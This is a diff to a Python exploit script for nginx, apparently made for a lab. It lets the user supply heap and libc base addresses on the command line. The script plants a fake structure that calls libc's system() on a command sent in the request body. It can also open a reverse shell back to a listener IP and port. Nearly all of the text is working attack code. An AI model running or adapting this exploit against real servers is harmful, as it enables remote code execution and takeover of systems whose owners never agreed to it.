@@ -15,9 +15,9 @@ for _b in range(256):
     if not (_t[_b >> 5] & (1 << (_b & 0x1f))):
         SAFE.add(_b)
 
-HEAP_BASE = 0x555555659000
-LIBC_BASE = 0x7ffff77ba000
-SYSTEM_ADDR = LIBC_BASE + 0x50d70
+DEFAULT_HEAP_BASE = 0x555555659000
+DEFAULT_LIBC_BASE = 0x7ffffefc0000
+SYSTEM_OFFSET = 0x50d70
 
 PREREAD_HEAP_OFFSETS = [
     0x05a427, 0x060e67,
@@ -32,8 +32,12 @@ def addr_is_safe(addr):
     return all(((addr >> (j * 8)) & 0xff) in SAFE for j in range(6))
 
 
-def make_body(cmd, data_addr):
-    fake_struct = struct.pack('<QQQ', SYSTEM_ADDR, data_addr, 0)
+def parse_addr(value):
+    return int(value, 0)
+
+
+def make_body(cmd, data_addr, system_addr):
+    fake_struct = struct.pack('<QQQ', system_addr, data_addr, 0)
     cmd_bytes = cmd.encode('utf-8') + b'\x00'
     payload = fake_struct + cmd_bytes
     if len(payload) > BODY_LEN:
@@ -153,6 +157,12 @@ def main():
                         help="port to listen on for reverse shell (default: 1337)")
     parser.add_argument("--listen-ip", type=str, default="172.17.0.1",
                         help="IP address for reverse shell to connect back to (default: 172.17.0.1)")
+    parser.add_argument("--heap-base", type=parse_addr, default=DEFAULT_HEAP_BASE,
+                        help=f"nginx heap/base address for this lab (default: {DEFAULT_HEAP_BASE:#x})")
+    parser.add_argument("--libc-base", type=parse_addr, default=DEFAULT_LIBC_BASE,
+                        help=f"libc base address for this lab (default: {DEFAULT_LIBC_BASE:#x})")
+    parser.add_argument("--system-addr", type=parse_addr,
+                        help="absolute system() address; overrides --libc-base")
     args = parser.parse_args()
 
     if not args.cmd and not args.shell:
@@ -162,6 +172,8 @@ def main():
 
     host = args.host
     port = args.port
+    heap_base = args.heap_base
+    system_addr = args.system_addr or (args.libc_base + SYSTEM_OFFSET)
     
     if args.shell:
         local_ip = args.listen_ip
@@ -189,13 +201,13 @@ def main():
 
     candidates = []
     for i, off in enumerate(PREREAD_HEAP_OFFSETS):
-        addr = HEAP_BASE + off
+        addr = heap_base + off
         if addr_is_safe(addr):
             candidates.append((i, addr))
 
     primary_addr = candidates[0][1]
     data_addr = primary_addr + 24
-    body = make_body(cmd, data_addr)
+    body = make_body(cmd, data_addr, system_addr)
 
     print(f"[*] Waiting for nginx on {host}:{port}...")
     if not wait_alive(host, port):
